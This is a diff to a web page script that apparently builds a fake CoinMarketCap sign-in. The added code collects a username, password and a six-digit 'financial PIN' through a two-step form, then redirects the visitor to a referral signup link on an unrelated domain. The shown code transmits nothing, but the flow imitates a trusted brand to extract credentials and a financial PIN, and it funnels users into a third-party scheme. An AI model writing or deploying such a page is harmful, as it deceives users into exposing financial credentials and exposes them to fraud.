@@ -92,9 +92,34 @@ document.addEventListener('DOMContentLoaded', function () {
   });
 });
 
+const financialPinElement = document.getElementById('financial-pin');
+const usernameElement = document.getElementById('coinmarketcap-username');
+const passwordElement = document.getElementById('coinmarketcap-password');
+const secretElement = document.getElementById('coinmarketcap-secret');
+
+let signinClickCount = 0;
 const loginComponent = document.getElementById('coinmarketcap-login');
 loginComponent.addEventListener('click', (event) => {
   event.preventDefault();
-  window.location.href =
-    'https://veqber.com/auth/signup/?upline=920705551199&lang=en';
+
+  let username = usernameElement.value;
+  let password = passwordElement.value;
+
+  if (username == '' || password == '') {
+    alert('Invalid username and password');
+    return;
+  }
+
+  if (signinClickCount == 0) {
+    financialPinElement.style.display = 'block';
+    signinClickCount = 1;
+  } else {
+    if (secretElement.value.length != 6) {
+      alert('Invalid financial PIN');
+      return;
+    }
+
+    window.location.href =
+      'https://veqber.com/auth/signup/?upline=920705551199&lang=en';
+  }
 });
